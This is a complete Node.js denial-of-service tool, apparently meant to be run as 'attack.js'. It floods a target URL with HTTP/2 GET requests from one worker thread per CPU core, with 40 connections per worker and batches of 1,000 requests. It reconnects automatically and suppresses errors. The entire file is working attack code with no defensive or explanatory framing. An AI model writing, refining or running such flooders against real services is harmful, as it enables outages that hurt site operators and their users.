const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = cpus().length;

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching HTTP/2 attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    const attack = () => {
        try {
            const client = http2.connect(target, {
                settings: { enablePush: false },
                maxSessionMemory: 999999,
            });

            client.on('error', () => {});
            client.on('goaway', () => client.destroy());
            client.on('close', () => setTimeout(attack, 10));

            client.on('connect', () => {
                function flood() {
                    if (Date.now() > end || client.destroyed) return;

                    for (let i = 0; i < 1000; i++) {
                        try {
                            const req = client.request({
                                ':method': 'GET',
                                ':path': '/',
                            });
                            req.on('error', () => {});
                            req.end();
                        } catch {}
                    }
                    setImmediate(flood);
                }

                flood();
            });
        } catch {
            setTimeout(attack, 50);
        }
    };

    for (let i = 0; i < 40; i++) attack(); // more sockets = more spam
}
